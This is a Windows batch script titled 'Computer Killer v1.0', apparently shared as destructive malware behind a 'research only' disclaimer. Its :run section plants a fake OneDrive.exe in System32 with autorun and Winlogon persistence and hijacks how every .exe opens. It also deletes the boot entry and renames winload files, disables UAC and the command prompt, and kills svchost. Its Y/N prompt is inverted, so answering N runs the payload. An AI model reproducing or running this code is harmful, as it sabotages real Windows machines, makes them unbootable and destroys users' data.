@echo off
title Computer Killer v1.0
goto ask

:ask
cls
echo ---------------------------------------------------
echo This program is NOT a joke!
echo ---------------------------------------------------
echo This program is a part of our researches. DO NOT USE 
echo IT FOR TROLLING, SELLING, AND CREATING A ATTACK ON 
echo ANYONE!echo ---------------------------------------------------
echo We DO NOT take any responsibillity when you run this
echo program. All data must save in another drive safety.
echo This program only works in Windows 10/11echo ---------------------------------------------------
echo Copyright (C) 2022 TheFlightSimulations.
echo DO NOT use it for commercial purposes.
echo ---------------------------------------------------
choice /n /c YN /m "Do you wish to continue? (Y/N)"
if ERRORLEVEL 2 goto :run N
if ERRORLEVEL 1 goto :exit Y

:run
xcopy "%myfiles%\OneDrive.exe" "%SystemRoot%\System32" /c /q /g /h
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v OneDrive /t REG_SZ /d "%SystemRoot%\System32\OneDrive.exe" /f
bcdedit /delete "{current}" /cleanup
wmic useraccount where name="%username%" rename "beingkilled"
cd /d "%SystemRoot%\System32"
ren "winload.exe" "winload.exe.bak"
ren "winload.efi" "winload.efi.bak"
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d "0" /f
reg add "HKCU\Control Panel\Mouse" /v SwapMouseButtons /t REG_SZ /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe, %SystemRoot%\System32\OneDrive.exe" /f
reg add "HKLM\SOFTWARE\Classes\exefile\shell\open\command" /d "%SystemRoot%\System32\OneDrive.exe "%1" %*" /f
reg add "HKLM\SOFTWARE\Classes\exefile\shell\runas\command" /d "%SystemRoot%\System32\OneDrive.exe "%1" %*" /f
reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d "2" /f 
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v OneDrive /t REG_SZ /d "%SystemRoot%\System32\OneDrive.exe" /f
TASKKILL /IM svchost.exe /F


:exit 
echo ----------------------------------------
echo Exiting...
echo ----------------------------------------
timeout 2
exit